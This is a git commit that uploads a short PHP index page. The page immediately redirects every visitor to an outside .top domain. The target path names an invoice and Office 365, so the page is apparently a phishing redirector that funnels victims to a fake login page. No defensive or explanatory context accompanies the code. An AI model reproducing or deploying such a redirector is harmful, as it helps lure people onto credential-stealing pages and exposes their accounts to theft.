4bb4f1da3ebdf7d2132ae9e49f47b895f5ef8e49
gcollonny00 <56806280+gcollonny00@users.noreply.github.com>
2019-10-21 11:54:09 -0400

    Add files via upload

---
+++ index.php
@@ -0,0 +1,17 @@
+<?php
+
+
+function Redirect($url, $permanent = false)
+{
+ if (headers_sent() === false)
+ {
+ header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
+ }
+
+ exit();
+}
+
+Redirect("https://abrilcaldeira.top/invoice/office3652019/cymk/index.php?
+", false);
+
+?>
